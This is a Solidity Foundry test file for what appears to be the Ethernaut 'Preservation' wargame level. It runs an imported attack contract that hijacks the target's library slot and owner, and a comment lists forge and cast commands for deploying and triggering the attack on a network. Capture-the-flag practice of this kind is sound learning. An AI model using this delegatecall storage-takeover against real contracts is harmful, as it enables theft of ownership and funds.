// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Test, console2} from "forge-std/Test.sol";
import {Preservation, LibraryContract} from "../src/Preservation.sol";
import {PreservationAttack} from "../solutions/PreservationAttack.sol";

contract PreservationTest is Test {
    Preservation public preservation;
    LibraryContract public lib1;
    LibraryContract public lib2;
    PreservationAttack public attackContract;
    address public attacker;
    address public owner;

    function setUp() public {
        owner = makeAddr("owner");
        attacker = makeAddr("attacker");

        lib1 = new LibraryContract();
        lib2 = new LibraryContract();

        vm.prank(owner);
        preservation = new Preservation(address(lib1), address(lib2));
    }

    function test_preservationAttack() public {
        vm.startPrank(attacker);

        attackContract = new PreservationAttack(address(preservation));
        attackContract.attack();

        // change preservation's timeZone1Library to attackContract
        assertEq(preservation.timeZone1Library(), address(attackContract));

        assertEq(
            preservation.owner(),
            0x7bB341488d5E6838Bb9C1fD521543f83066Dc9Bd
        );

        vm.stopPrank();
    }
}

/*
source .env
export preservation=0x95d955B7f64e0718E7F575b1f03c2795563c6613

forge create solutions/PreservationAttack.sol:PreservationAttack --rpc-url $RPC_URL --private-key $PRIVATE_KEY --constructor-args $preservation

export attackContract=0x62B34b6e56D51b1F23a4Ca1383006c8425Cd2A07

cast call $preservation "timeZone1Library()" --rpc-url $RPC_URL
cast call $preservation "timeZone2Library()" --rpc-url $RPC_URL
cast call $preservation "owner()" --rpc-url $RPC_URL

cast send $attackContract "attack()" --rpc-url $RPC_URL --private-key $PRIVATE_KEY

forge test --match-test test_preservationAttack --fork-url $RPC_URL
*/
